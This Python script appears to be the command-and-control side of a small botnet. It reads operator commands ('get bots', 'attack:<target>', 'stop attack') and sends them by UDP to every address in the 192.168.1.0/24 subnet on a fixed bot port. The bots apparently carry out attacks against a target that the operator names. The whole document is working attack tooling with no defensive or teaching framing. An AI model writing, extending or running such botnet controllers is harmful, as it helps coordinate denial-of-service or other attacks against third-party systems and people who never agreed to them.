import socket
import ipaddress
import sys

BOT_PORT = 3140

print("UDP target port: %s" % BOT_PORT)
sock = socket.socket(
        socket.AF_INET, # Internet
        socket.SOCK_DGRAM # UDP
) 


ips = [str(ip) for ip in ipaddress.IPv4Network('192.168.1.0/24')]
ips = ips[1:-1]

for line in sys.stdin:
    command = line.rstrip()
    if command == "get bots":
        MESSAGE = b"send ip"
        for ip in ips:
            try:
                sock.sendto(MESSAGE, (str(ip), BOT_PORT))
            except:
                pass
    elif command == "stop attack":
        MESSAGE = b"stop"
        for ip in ips:
            try:
                sock.sendto(MESSAGE, (str(ip), BOT_PORT))
            except:
                pass
    elif "attack" in command:
        MESSAGE = b"attack:" + command[command.index(":")+1:].encode()
        for ip in ips:
            try:
                sock.sendto(MESSAGE, (str(ip), BOT_PORT))
            except:
                pass

    print("Command sent.")
